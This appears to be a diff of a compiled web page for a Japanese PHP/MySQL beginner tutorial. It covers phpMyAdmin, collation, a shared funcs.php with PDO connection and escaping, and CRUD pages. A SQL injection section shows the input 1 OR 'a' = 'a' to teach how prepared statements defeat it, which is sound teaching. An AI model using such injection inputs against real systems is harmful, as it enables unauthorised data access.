 `,e.jsxs(n,{summary:"phpMyAdminとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"phpMyAdmin"})," は、WebブラウザからMySQLを操作・管理できるWebアプリケーション"]}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsx("div",{className:"font-medium text-blue-800",children:"通常の操作（コマンドライン）"})]}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"方法:"})," ターミナルでSQL文を直接実行",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"難易度:"})," 高い",e.jsx("br",{}),`
@@ -3418,7 +3440,7 @@ graph LR
 `]}),`
 `]}),`
 `]}),e.jsx(r,{type:"warning",title:"注意点",children:e.jsxs(s.p,{children:["データベース名 ",e.jsx(s.code,{children:"gs_db"}),` の後ろに半角スペースが入らないよう注意！
-過去にスペースが原因で動作しないケースがあった`]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. テーブル作成："})}),e.jsxs(s.ol,{children:[`
+過去にスペースが原因で動作しないケースがありました`]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. テーブル作成："})}),e.jsxs(s.ol,{children:[`
 `,e.jsxs(s.li,{children:[`
 `,e.jsxs(s.p,{children:[e.jsx(s.code,{children:"gs_db"})," データベースが選択されていることを確認"]}),`
 `]}),`
@@ -3440,9 +3462,9 @@ CREATE TABLE gs_an_table (
     email varchar(256) NOT NULL,
     naiyou text DEFAULT NULL,
     indate datetime NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
 `})})]}),`
-`,e.jsxs(n,{summary:"照合順序（Collation）について",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"照合順序"}),"は、データの並び替えや比較のルールを決める設定"]}),e.jsx(l,{children:e.jsx("div",{className:"space-y-3",children:e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"主要な照合順序の比較"}),e.jsxs("div",{className:"space-y-3 text-sm",children:[e.jsxs("div",{className:"p-2 bg-blue-50 rounded",children:[e.jsx("div",{className:"font-medium text-blue-800",children:"utf8mb4_general_ci"}),e.jsx("div",{className:"text-blue-700",children:"A = a（区別しない）、🍣 = 🍺（区別しない）、は ≠ ぱ ≠ ば（区別する）"})]}),e.jsxs("div",{className:"p-2 bg-green-50 rounded",children:[e.jsx("div",{className:"font-medium text-green-800",children:"utf8mb4_unicode_ci"}),e.jsx("div",{className:"text-green-700",children:"A = a（区別しない）、🍣 = 🍺（区別しない）、は = ぱ = ば（区別しない）"})]}),e.jsxs("div",{className:"p-2 bg-orange-50 rounded",children:[e.jsx("div",{className:"font-medium text-orange-800",children:"utf8mb4_unicode_520_ci"}),e.jsx("div",{className:"text-orange-700",children:"A = a（区別しない）、🍣 ≠ 🍺（区別する）、は = ぱ = ば（区別しない）"})]}),e.jsxs("div",{className:"p-2 bg-red-50 rounded",children:[e.jsx("div",{className:"font-medium text-red-800",children:"utf8mb4_bin"}),e.jsx("div",{className:"text-red-700",children:"A ≠ a（区別する）、🍣 ≠ 🍺（区別する）、は ≠ ぱ ≠ ば（区別する）"})]})]})]})})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"用語解説："})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(n,{summary:"照合順序（Collation）について",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"照合順序"}),"は、データの並び替えや比較のルールを決める設定"]}),e.jsx(l,{children:e.jsx("div",{className:"space-y-3",children:e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"主要な照合順序の比較"}),e.jsxs("div",{className:"space-y-3 text-sm",children:[e.jsxs("div",{className:"p-2 bg-blue-50 rounded border-2 border-blue-400",children:[e.jsx("div",{className:"font-medium text-blue-800",children:"utf8mb4_general_ci（phpMyAdminのデフォルト）"}),e.jsx("div",{className:"text-blue-700",children:"A = a（区別しない）、🍣 = 🍺（区別しない）、は ≠ ぱ ≠ ば（区別する）"})]}),e.jsxs("div",{className:"p-2 bg-green-50 rounded",children:[e.jsx("div",{className:"font-medium text-green-800",children:"utf8mb4_unicode_ci"}),e.jsx("div",{className:"text-green-700",children:"A = a（区別しない）、🍣 = 🍺（区別しない）、は = ぱ = ば（区別しない）"})]}),e.jsxs("div",{className:"p-2 bg-orange-50 rounded",children:[e.jsx("div",{className:"font-medium text-orange-800",children:"utf8mb4_unicode_520_ci"}),e.jsx("div",{className:"text-orange-700",children:"A = a（区別しない）、🍣 ≠ 🍺（区別する）、は = ぱ = ば（区別しない）"})]}),e.jsxs("div",{className:"p-2 bg-red-50 rounded",children:[e.jsx("div",{className:"font-medium text-red-800",children:"utf8mb4_bin"}),e.jsx("div",{className:"text-red-700",children:"A ≠ a（区別する）、🍣 ≠ 🍺（区別する）、は ≠ ぱ ≠ ば（区別する）"})]})]})]})})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"用語解説："})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"utf8 vs utf8mb4"}),": 最大バイト数の違い（3バイト vs 4バイト）",`
 `,e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"utf8mb4は絵文字や特殊文字も表現可能"}),`
@@ -3450,8 +3472,8 @@ CREATE TABLE gs_an_table (
 `]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"ci (Case Insensitive)"}),": 大文字小文字を区別しない"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"bin (Binary)"}),": バイナリ比較（完全一致のみ）"]}),`
-`]}),e.jsx(r,{type:"tip",title:"推奨設定",children:e.jsxs(s.p,{children:["一般的なWebアプリケーションでは ",e.jsx(s.code,{children:"utf8mb4_unicode_ci"}),` がおすすめ。
-日本語の処理が適切で、絵文字にも対応`]})})]}),`
+`]}),e.jsx(r,{type:"tip",title:"推奨設定",children:e.jsxs(s.p,{children:[e.jsx(s.code,{children:"utf8mb4_general_ci"}),`（phpMyAdminのデフォルト）で問題ありません。
+日本語の処理が適切で、絵文字にも対応しています。`]})})]}),`
 `,e.jsx(s.h2,{children:"CREATE（データ登録）処理"}),`
 `,e.jsxs(n,{summary:"SQLの基本ルール",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"コメントの書き方："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- これはコメントです
 `})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"文字列の書き方："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- シングルクォーテーション（'）を使用
@@ -3541,8 +3563,114 @@ SELECT * FROM scores
 ORDER BY score DESC 
 LIMIT 3;
 `})})]}),`
+`,e.jsx(s.h2,{children:"共通関数ファイル（funcs.php）の作成"}),`
+`,e.jsxs(n,{summary:"なぜ関数を外部ファイルに切り出すのか？",children:[e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"複数のページで同じ処理（DB接続など）を使いたい場合、毎回同じコードを書くのは非効率"}),`
+`,e.jsx(s.li,{children:"外部ファイルに関数をまとめて、各ページで読み込む方法を学ぶ"}),`
+`]}),e.jsx(r,{type:"info",title:"includeの役割",children:e.jsxs(s.p,{children:[e.jsx(s.code,{children:'include("ファイル名")'})," を使うと、別ファイルのコードを読み込んで使えるようになる"]})}),e.jsx(i,{children:`
+flowchart LR
+  A[funcs.php] -->|include| B[index.php]
+  A -->|include| C[select.php]
+  A -->|include| D[detail.php]
+  A -->|include| E[その他のページ]
+`})]}),`
+`,e.jsxs(n,{summary:"funcs.phpを作成する",children:[e.jsxs(s.p,{children:["まず、共通で使う関数をまとめた ",e.jsx(s.code,{children:"funcs.php"})," を作成する"]}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
+// ===========================================
+// 共通関数ファイル（funcs.php）
+// ===========================================
+// このファイルには、複数のページで使用する
+// 共通の関数をまとめています。
+// 各ページで include("funcs.php"); として読み込みます。
+// ===========================================
+
+
+// -----------------------------------------
+// XSS対策用のエスケープ関数
+// -----------------------------------------
+// 使用場所: HTMLに値を出力する全ての箇所
+// 目的: <script>などの悪意あるコードを無効化
+// -----------------------------------------
+function h($str) {
+    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
+}
+
+
+// -----------------------------------------
+// データベース接続関数
+// -----------------------------------------
+// 戻り値: PDOオブジェクト
+// 目的: DB接続処理を1箇所にまとめて保守性向上
+// -----------------------------------------
+function db_conn() {
+    try {
+        // -----------------------------------------
+        // ローカル環境（XAMPP/MAMP）の設定
+        // -----------------------------------------
+        $db_name = "gs_db";      // データベース名
+        $db_id   = "root";       // ユーザー名
+        $db_pw   = "";           // パスワード（XAMPPは空、MAMPは"root"）
+        $db_host = "localhost";  // ホスト名
+
+        // -----------------------------------------
+        // 本番環境の設定（さくらサーバーなど）
+        // localhost以外の場合に切り替わる
+        // -----------------------------------------
+        if ($_SERVER["HTTP_HOST"] != 'localhost') {
+            $db_name = "";       // 本番環境のDB名
+            $db_id   = "";       // 本番環境のユーザー名
+            $db_pw   = "";       // 本番環境のパスワード
+            $db_host = "";       // 本番環境のホスト名
+        }
+
+        // -----------------------------------------
+        // PDOでデータベースに接続
+        // -----------------------------------------
+        return new PDO(
+            'mysql:dbname=' . $db_name . ';charset=utf8;host=' . $db_host,
+            $db_id,
+            $db_pw
+        );
+
+    } catch (PDOException $e) {
+        // 接続エラーの場合はメッセージを表示して終了
+        exit('DB Connection Error: ' . $e->getMessage());
+    }
+}
+
+
+// -----------------------------------------
+// SQLエラー表示関数
+// -----------------------------------------
+// 引数: $stmt - PDOStatementオブジェクト
+// 目的: SQLエラー処理を統一化
+// -----------------------------------------
+function sql_error($stmt) {
+    $error = $stmt->errorInfo();
+    exit("SQL Error: " . $error[2]);
+}
+
+
+// -----------------------------------------
+// リダイレクト関数
+// -----------------------------------------
+// 引数: $file_name - リダイレクト先のファイル名
+// 目的: ページ遷移処理を統一化
+// -----------------------------------------
+function redirect($file_name) {
+    header("Location: " . $file_name);
+    exit();
+}
+`})}),e.jsx(r,{type:"tip",title:"funcs.phpに含まれる関数",children:e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"関数名"}),e.jsx(s.th,{children:"役割"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.code,{children:"h($str)"})}),e.jsx(s.td,{children:"XSS対策（HTMLエスケープ）"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.code,{children:"db_conn()"})}),e.jsx(s.td,{children:"データベース接続"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.code,{children:"sql_error($stmt)"})}),e.jsx(s.td,{children:"SQLエラー表示"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.code,{children:"redirect($file_name)"})}),e.jsx(s.td,{children:"ページ遷移"})]})]})]})})]}),`
+`,e.jsxs(n,{summary:"funcs.phpの読み込み方",children:[e.jsxs(s.p,{children:["他のPHPファイルで ",e.jsx(s.code,{children:"funcs.php"})," を使うには、ファイルの先頭で読み込む"]}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
+// funcs.phpを読み込む
+include("funcs.php");
+
+// これでfuncs.php内の関数が使えるようになる
+$pdo = db_conn();  // データベース接続
+`})}),e.jsx(r,{type:"warning",title:"読み込み位置に注意",children:e.jsxs(s.p,{children:[e.jsx(s.code,{children:'include("funcs.php");'})," は必ず ",e.jsx(s.strong,{children:"ファイルの先頭"}),"（他の処理より前）に書く"]})}),e.jsx(r,{type:"tip",title:"次のステップ",children:e.jsxs(s.p,{children:[e.jsx(s.code,{children:"funcs.php"})," が準備できたら、実際に ",e.jsx(s.code,{children:"insert.php"}),` で使ってみよう！
+この後のセクションで、データベースへの登録処理を実装していきます。`]})})]}),`
 `,e.jsx(s.h2,{children:"PDOによるデータベース接続"}),`
-`,e.jsxs(n,{summary:"PDOとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"PDO（PHP Data Objects）"})," は、PHPからデータベースに接続するためのクラス"]}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4",children:e.jsx("div",{className:"w-8 h-8 text-slate-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})})}),e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"PDOの役割"}),e.jsx("div",{className:"text-sm text-slate-600 max-w-md mx-auto",children:e.jsx(s.p,{children:"PHPアプリケーションとデータベースの橋渡し役"})})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("div",{className:"p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800",children:"1. 接続"}),e.jsx("div",{className:"text-sm text-blue-700",children:"データベースへの接続を確立"})]}),e.jsxs("div",{className:"p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800",children:"2. 実行"}),e.jsx("div",{className:"text-sm text-green-700",children:"SQL文を安全に実行"})]}),e.jsxs("div",{className:"p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800",children:"3. 結果"}),e.jsx("div",{className:"text-sm text-orange-700",children:"データの取得・操作結果を返却"})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"PDOの利点："})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(n,{summary:"PDOとは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"PDO（PHP Data Objects）"})," は、PHPからデータベースに接続するためのクラス"]}),e.jsx(l,{children:e.jsx("div",{className:"space-y-4",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("div",{className:"p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800",children:"1. 接続"}),e.jsx("div",{className:"text-sm text-blue-700",children:"データベースへの接続を確立"})]}),e.jsxs("div",{className:"p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800",children:"2. 実行"}),e.jsx("div",{className:"text-sm text-green-700",children:"SQL文を安全に実行"})]}),e.jsxs("div",{className:"p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800",children:"3. 結果"}),e.jsx("div",{className:"text-sm text-orange-700",children:"データの取得・操作結果を返却"})]})]})})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"PDOの利点："})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"セキュリティ"}),": SQLインジェクション対策"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"汎用性"}),": 複数のデータベース（MySQL、PostgreSQL、SQLiteなど）に対応"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"オブジェクト指向"}),": クラスベースの操作"]}),`
@@ -3754,107 +3882,6 @@ $status = $stmt->execute();
 `,e.jsx("strong",{children:"リスク:"})," データ漏洩、不正操作"]})})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"})})}),e.jsx("div",{className:"font-medium text-green-800",children:"安全なコード"})]}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"入力:"})," ",e.jsx(s.code,{children:"1 OR 'a' = 'a'"}),e.jsx("br",{}),`
 `,e.jsx("strong",{children:"結果:"})," エラーまたは該当なし",e.jsx("br",{}),`
 `,e.jsx("strong",{children:"利点:"})," 攻撃を無効化"]})})]})]})})]}),`
-`,e.jsx(s.h2,{children:"関数化によるコード改善"}),`
-`,e.jsxs(n,{summary:"なぜ関数化が重要なのか？",children:[e.jsxs(s.p,{children:["現在のコードには",e.jsx(s.strong,{children:"同じような処理が繰り返し"}),"書かれている。これを関数化することで："]}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsx("div",{className:"font-medium text-red-800",children:"関数化前の問題"})]}),e.jsx("div",{className:"text-sm text-red-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"コードの重複:"})," DB接続処理が各ファイルに散在",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"保守性の悪化:"})," 修正時に複数箇所を変更",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"可読性の低下:"})," 本質的でない処理が混在",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"エラー処理:"})," 統一されていない"]})})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"})})}),e.jsx("div",{className:"font-medium text-green-800",children:"関数化後の利点"})]}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"再利用性:"})," 一度書けば何度でも使用可能",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"保守性:"})," 修正は関数内の1箇所のみ",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"可読性:"})," メイン処理に集中できる",e.jsx("br",{}),`
-`,e.jsx("strong",{children:"テスト:"})," 関数単位でのテストが容易"]})})]})]})}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"DRY原則（Don't Repeat Yourself）"}),`
-同じコードを繰り返し書くことを避け、一箇所に集約する設計原則`]})]}),`
-`,e.jsxs(n,{summary:"データベース接続関数の作成",children:[e.jsx(s.p,{children:e.jsxs(s.strong,{children:[e.jsx(s.code,{children:"funcs.php"})," に ",e.jsx(s.code,{children:"db_conn()"})," 関数を追加："]})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
-function h($value) {
-    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
-}
-
-function db_conn() {
-    try {
-        // localhost環境の設定
-        $db_name = "gs_db";         // データベース名
-        $db_id   = "root";          // アカウント名
-        $db_pw   = "";              // パスワード（MAMP の場合は "root"）
-        $db_host = "localhost";     // DBホスト
-        
-        // 本番環境用の設定（さくらサーバーなど）
-        if ($_SERVER["HTTP_HOST"] != 'localhost') {
-            $db_name = "your_db_name";     // 本番環境のDB名
-            $db_id   = "your_db_user";     // 本番環境のユーザー名
-            $db_pw   = "your_db_password"; // 本番環境のパスワード
-            $db_host = "your_db_host";     // 本番環境のホスト
-        }
-        
-        return new PDO('mysql:dbname=' . $db_name . ';charset=utf8;host=' . $db_host, $db_id, $db_pw);
-    } catch (PDOException $e) {
-        exit('DB Connection Error:' . $e->getMessage());
-    }
-}
-?>
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"関数の特徴："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"1"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"環境自動判定"}),e.jsx("div",{className:"text-sm text-slate-600",children:"localhost と本番環境を自動で切り替え"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"2"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"エラーハンドリング"}),e.jsx("div",{className:"text-sm text-slate-600",children:"接続エラー時は適切なメッセージで終了"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"3"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PDOオブジェクト返却"}),e.jsx("div",{className:"text-sm text-slate-600",children:"すぐに使用可能な接続オブジェクトを返す"})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"既存ファイルの書き換え（insert.php）："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
-// 古いコード（削除）
-/*
-try {
-    $pdo = new PDO('mysql:dbname=gs_db;charset=utf8;host=localhost', 'root', '');
-} catch (PDOException $e) {
-    exit('DBConnection Error:' . $e->getMessage());
-}
-*/
-
-// 新しいコード
-include("funcs.php");
-$pdo = db_conn();
-?>
-`})}),e.jsxs(r,{type:"tip",title:"コードの簡潔性",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"Before"}),`: 6行のDB接続コード
-`,e.jsx(s.strong,{children:"After"}),": 2行で同じ機能"]}),e.jsx(s.p,{children:"これで保守性と可読性が大幅に向上！"})]})]}),`
-`,e.jsxs(n,{summary:"エラー処理・リダイレクト関数の作成",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"SQLエラー関数の作成："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`// SQLエラー関数：sql_error($stmt)
-function sql_error($stmt) {
-    $error = $stmt->errorInfo();
-    exit("SQLError:" . $error[2]);
-}
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"リダイレクト関数の作成："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`// リダイレクト関数: redirect($file_name)
-function redirect($file_name) {
-    header("Location: " . $file_name);
-    exit();
-}
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"insert.php の改善："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
-// 1. POSTデータ取得
-$name = $_POST['name'];
-$email = $_POST['email'];
-$naiyou = $_POST['naiyou'];
-
-// 2. DB接続
-include("funcs.php");
-$pdo = db_conn();
-
-// 3. SQL実行
-$sql = "INSERT INTO gs_an_table(name, email, naiyou, indate) VALUES(:name, :email, :naiyou, sysdate())";
-$stmt = $pdo->prepare($sql);
-$stmt->bindValue(':name', $name, PDO::PARAM_STR);
-$stmt->bindValue(':email', $email, PDO::PARAM_STR);
-$stmt->bindValue(':naiyou', $naiyou, PDO::PARAM_STR);
-$status = $stmt->execute();
-
-// 4. 結果判定（改善後）
-if ($status == false) {
-    sql_error($stmt);     // 関数化
-} else {
-    redirect("index.php"); // 関数化
-}
-?>
-`})}),e.jsx(i,{children:`
-graph TD
-  A[処理実行] --> B{成功？}
-  B -->|エラー| C[sql_error関数]
-  B -->|成功| D[redirect関数]
-  C --> E[エラーメッセージ表示]
-  D --> F[指定ページへ移動]
-  
-  style A fill:#e2e8f0
-  style C fill:#fef2f2
-  style D fill:#dcfce7
-`}),e.jsx(r,{type:"success",title:"関数化の効果",children:e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"エラー処理の統一"}),`: 全ファイルで同じエラー表示
-`,e.jsx(s.strong,{children:"リダイレクトの簡素化"}),`: 1行でページ遷移
-`,e.jsx(s.strong,{children:"保守性の向上"}),": エラーメッセージ形式の変更が容易"]})})]}),`
 `,e.jsx(s.h2,{children:"UPDATE（データ更新）処理"}),`
 `,e.jsxs(n,{summary:"更新処理の流れ",children:[e.jsx(s.p,{children:"データの更新は以下の手順で行う："}),e.jsx(i,{children:`
 graph LR
@@ -4060,8 +4087,7 @@ graph LR
   style A fill:#e2e8f0
   style B fill:#fef2f2
   style C fill:#e2e8f0
-`}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"削除処理の特徴："})}),e.jsxs(s.ul,{children:[`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"確認画面なし"}),": 直接削除（実際のアプリでは確認が必要）"]}),`
+`}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"GET パラメータ"}),": IDをURLで受け取り"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"即座にリダイレクト"}),": 削除後は一覧画面へ"]}),`
 `]}),e.jsxs(r,{type:"warning",title:"削除処理の注意点",children:[e.jsx(s.p,{children:"今回は学習用のシンプルな実装ですが、実際のアプリケーションでは："}),e.jsxs(s.ul,{children:[`
@@ -4238,17 +4264,19 @@ if ($status == false) {
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"funcs.php"}),": 共通関数群"]}),`
 `]})]}),`
 `,e.jsx(s.h2,{children:"まとめ"}),`
-`,e.jsx(n,{summary:"今回学んだこと",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データベースの基本概念"}),e.jsx("div",{className:"text-sm text-slate-600",children:"RDB、テーブル、RDBMS、SQLの関係性"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"SQL基本文法（CRUD）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"INSERT、SELECT、UPDATE、DELETE、WHERE、ORDER BY"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PDOによるDB接続"}),e.jsx("div",{className:"text-sm text-slate-600",children:"PHP からデータベースへの安全な接続方法"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 